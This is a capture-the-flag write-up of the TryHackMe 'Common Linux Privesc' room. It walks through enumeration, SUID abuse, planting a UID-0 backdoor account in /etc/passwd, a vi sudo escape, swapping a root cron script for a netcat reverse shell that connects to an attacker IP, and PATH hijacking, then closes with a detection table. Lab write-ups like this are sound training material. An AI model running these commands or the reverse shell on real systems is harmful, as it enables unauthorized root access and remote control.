# Common Linux Privilege Escalation — Write-Up

**Platform:** TryHackMe  
**Room:** [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)  
**Difficulty:** Easy  
**Author:** XENOS (obadahamed.github.io)

---

## Table of Contents

1. [What is Privilege Escalation?](#1-what-is-privilege-escalation)
2. [Types of Privilege Escalation](#2-types-of-privilege-escalation)
3. [Enumeration with LinEnum](#3-enumeration-with-linenum)
4. [Abusing SUID Binaries](#4-abusing-suid-binaries)
5. [Exploiting Writable /etc/passwd](#5-exploiting-writable-etcpasswd)
6. [Escaping Vi Editor (Sudo Misconfiguration)](#6-escaping-vi-editor-sudo-misconfiguration)
7. [Exploiting Crontab](#7-exploiting-crontab)
8. [Exploiting PATH Variable](#8-exploiting-path-variable)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. What is Privilege Escalation?

Privilege escalation means going from a **lower-permission account** to a **higher-permission account** — typically reaching `root`. It's not always about a flashy exploit. Most of the time it's about a misconfiguration someone forgot, a permission that was set wrong, or a scheduled task running as root on a file you can edit.

In a real penetration test, you almost never land directly as root. You get a foothold as a low-privilege user, and then you work your way up. That's where privesc lives.

**Why it matters:**
- Reset passwords
- Bypass access controls
- Modify system configurations
- Establish persistence
- Access protected data

---

## 2. Types of Privilege Escalation

There are two directions you can move:

**Horizontal Escalation** — Move *sideways* on the privilege tree. You take over another user at the same privilege level. This is useful when that user has access to something valuable (like an SUID binary in their home directory) that you can then use to go vertical.

**Vertical Escalation** — Move *upward*. Gain higher privileges than your current account — ideally root. This is the main goal in most scenarios.

Think of it like a tree. Horizontal = same branch, different leaf. Vertical = climbing to a higher branch.

---

## 3. Enumeration with LinEnum

Before you exploit anything, you enumerate. The tool used here is **LinEnum** — a bash script that automates the collection of privilege escalation vectors.

**Get LinEnum on the target:**

```bash
# On your attack machine — start a web server in the LinEnum directory
python3 -m http.server 8000

# On the target machine — download it
wget http://YOUR_IP:8000/LinEnum.sh

# Make it executable
chmod +x LinEnum.sh

# Run it
./LinEnum.sh
```

> `chmod +x` — removes the restriction that prevents executing a file. The `+x` adds the execute bit for all users.

**What to look for in the output:**

| Section | What it tells you |
|---|---|
| Kernel info | Possible kernel exploits |
| World-writable files | Files any user can write to (dangerous if system files) |
| SUID files | Binaries that run as their owner, not you |
| Crontab contents | Scheduled tasks — especially ones running as root |

**Manual enumeration answers from the room:**

```bash
# Get the hostname
hostname
# → polobox

# Count user accounts
cat /etc/passwd | grep "user[0-9]"
# → user1 through user8 = 8 users

# Check available shells
cat /etc/shells
# → /bin/sh, /bin/dash, /bin/bash, /bin/rbash = 4 shells

# Check scheduled cron jobs
cat /etc/crontab
# → autoscript.sh runs every 5 minutes as root

# Check for writable sensitive files
# LinEnum flagged: /etc/passwd has rw-rw-r-- (world-readable, group-writable)
```

---

## 4. Abusing SUID Binaries

### The Concept

In Linux, every file has permission bits: `rwx` for owner, group, and others. When a file has the **SUID bit** set, it runs with the permissions of its *owner*, not the person executing it. If root owns an SUID binary — it runs as root, regardless of who launches it.

**Permission structure:**

```
r = read  = 4
w = write = 2
x = execute = 1
```

**What SUID looks like:**

```
-rwsr-xr-x   ← SUID set (notice the 's' in place of owner's 'x')
-rwxrws-rwx  ← SGID set (same concept but for group)
```

### Finding SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Breaking this down piece by piece:

| Part | Meaning |
|---|---|
| `find` | Start a search |
| `/` | Search from the root of the filesystem (everywhere) |
| `-perm -u=s` | Find files that have the SUID bit set for the owner |
| `-type f` | Only return files (not directories) |
| `2>/dev/null` | Redirect error messages to nowhere — keeps output clean |

### The Exploit

Inside user3's home directory:

```bash
user3@polobox:~$ ls -la
-rwsr-xr-x  1 root  root  8392 Jun  4  2019 shell
```

The file `shell` is owned by root and has the SUID bit set (`rws`). Running it gives a root shell because the OS executes it under root's identity.

```bash
./shell
# → root shell
```

**Answer:** `/home/user3/shell`

---

## 5. Exploiting Writable /etc/passwd

### The Concept

`/etc/passwd` stores all user account information — one entry per line. Normally only root can write to it. But if misconfigured permissions allow a regular user to write to it, we can add our own root-level user.

**Format of a `/etc/passwd` entry:**

```
username:password:UID:GID:comment:home_dir:shell
```

Example of a root account:
```
root:x:0:0:root:/root:/bin/bash
```

- `x` in the password field means the actual hash is stored in `/etc/shadow`
- UID `0` = root
- GID `0` = root group
- `/bin/bash` = shell on login

If we replace `x` with an actual password hash and set UID/GID to 0 — we create a backdoor root account.

### The Exploit

From enumeration: user7 is in the root group (GID 0), and `/etc/passwd` has write permissions for the group.

```bash
# Switch to user7
su - user7
# Password: password

# Generate a password hash using OpenSSL
openssl passwd -1 -salt new 123
```

Breaking down `openssl passwd -1 -salt new 123`:

| Part | Meaning |
|---|---|
| `passwd` | Use the password hashing function |
| `-1` | Use MD5-based hashing algorithm |
| `-salt new` | Use "new" as the salt (a value mixed in before hashing) |
| `123` | The password to hash |

**Output:**
```
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

Now craft the new user entry:

```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

Append it to `/etc/passwd`:

```bash
nano /etc/passwd
# Add the line at the end, save

# Login as the new user
su - new
# Password: 123
```

**Result:**

```bash
root@polobox:~#
```

The OS reads UID 0 → grants root-level access immediately.

**This is a vertical privilege escalation.**

---

## 6. Escaping Vi Editor (Sudo Misconfiguration)

### The Concept

`sudo -l` lists what commands the current user can run with `sudo`. Sometimes administrators grant users the ability to run specific programs as root — without requiring a password (`NOPASSWD`). If one of those programs can be abused to spawn a shell, you're root.

**GTFOBins** (https://gtfobins.github.io) is the go-to reference for this. It lists Unix binaries and exactly how to abuse them when they have elevated privileges.

### The Exploit

```bash
su - user8
# Password: password

sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/vi
```

user8 can run `vi` as root without a password. Inside vi, the `:!` command lets you run shell commands. So:

```bash
sudo vi
```

Once inside vi:

```
:!sh
```

This tells vi to execute the system shell — which runs as root because vi itself was launched as root.

```bash
# whoami
root
```

---

## 7. Exploiting Crontab

### The Concept

Cron is a daemon that runs scheduled tasks at defined intervals. These tasks are configured in `/etc/crontab`. If a cron job runs a script **as root**, but that script is **writable by a regular user** — you can replace its contents with a reverse shell payload.

**Crontab format:**

```
# m   h   dom  mon  dow  user   command
  */5  *   *    *    *    root   /home/user4/Desktop/autoscript.sh
```

| Field | Meaning |
|---|---|
| `*/5` | Every 5 minutes |
| `*` | Any hour, day, month, day-of-week |
| `root` | Run as root |
| `/home/user4/Desktop/autoscript.sh` | The script being executed |

### The Exploit

```bash
su - user4
# Password: password
```

**Step 1 — Generate a reverse shell payload on your attack machine:**

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=YOUR_IP lport=8888 R
```

Breaking this down:

| Part | Meaning |
|---|---|
| `-p cmd/unix/reverse_netcat` | Payload type — a netcat reverse shell as a raw command |
| `lhost=YOUR_IP` | Your attack machine IP (where the shell connects back to) |
| `lport=8888` | The port you'll be listening on |
| `R` | Output as raw format (no encoding) |

**Output example:**
```
mkfifo /tmp/mrimb; nc 10.8.106.222 8888 0</tmp/mrimb | /bin/sh >/tmp/mrimb 2>&1; rm /tmp/mrimb
```

**Step 2 — Replace the cron script with the payload:**

```bash
echo "mkfifo /tmp/mrimb; nc YOUR_IP 8888 0</tmp/mrimb | /bin/sh >/tmp/mrimb 2>&1; rm /tmp/mrimb" > /home/user4/Desktop/autoscript.sh
```

**Step 3 — Start your listener on the attack machine:**

```bash
nc -nlvp 8888
```

| Flag | Meaning |
|---|---|
| `-n` | No DNS resolution |
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-p 8888` | Port to listen on |

**Step 4 — Wait ~5 minutes.**

When cron executes `autoscript.sh` as root, the reverse shell connects back to your listener:

```bash
connect to [10.8.106.222] from (UNKNOWN) [10.10.98.105] 43252
whoami
root
```

---

## 8. Exploiting PATH Variable

### The Concept

`PATH` is an environment variable that tells the shell where to look for executables when you run a command by name. When you type `ls`, the shell doesn't know where `ls` lives — it searches through every directory listed in `PATH` until it finds a match.

```bash
echo $PATH
# → /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**The attack:** If an SUID binary (running as root) internally calls a command like `ls` without its full path, and we can modify `PATH` to point to a directory we control — we can place a fake `ls` there that runs `/bin/bash` instead. The SUID binary calls our fake `ls`, which opens a shell as root.

### The Exploit

```bash
su - user5
# Password: password

# The 'script' binary runs 'ls' internally
./script
# → Desktop Documents Downloads Music ...
```

**Step 1 — Go to /tmp and create a fake `ls`:**

```bash
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
```

`/bin/bash` is what the fake `ls` will execute when called. `chmod +x` makes it executable.

**Step 2 — Hijack PATH:**

```bash
export PATH=/tmp:$PATH
```

`export` modifies the environment variable for this session. By prepending `/tmp`, the shell will find our fake `ls` in `/tmp` *before* it reaches `/usr/bin/ls`.

**Step 3 — Run the SUID binary:**

```bash
cd ~
./script
```

The binary calls `ls`, the shell finds `/tmp/ls` first, executes it — which runs `/bin/bash` — under root privileges.

```bash
root@polobox:~#
```

**Reset PATH when done:**

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```

---

## 9. Key Takeaways

| Technique | Root Cause | Detection |
|---|---|---|
| SUID Binary Abuse | Binary owned by root with SUID bit | `find / -perm -u=s -type f 2>/dev/null` |
| Writable /etc/passwd | World/group-writable sensitive file | `ls -la /etc/passwd` |
| Sudo Misconfiguration | NOPASSWD entry on exploitable binary | `sudo -l` → cross-reference GTFOBins |
| Crontab Exploitation | Root-owned cron runs user-writable script | `cat /etc/crontab` |
| PATH Variable Hijack | SUID binary calls command without full path | Code review of the binary + `strings` |

**General enumeration checklist:**
- `hostname`, `whoami`, `id`
- `cat /etc/passwd` — users and shells
- `cat /etc/crontab` — scheduled jobs
- `sudo -l` — what can you run as root
- `find / -perm -u=s -type f 2>/dev/null` — SUID binaries
- `ls -la /etc/passwd /etc/shadow /etc/sudoers` — permission checks
- Run LinEnum for a comprehensive sweep

---

*Write-up by XENOS — [obadahamed.github.io](https://obadahamed.github.io)*  
*GitHub: [github.com/obadahamed](https://github.com/obadahamed)*
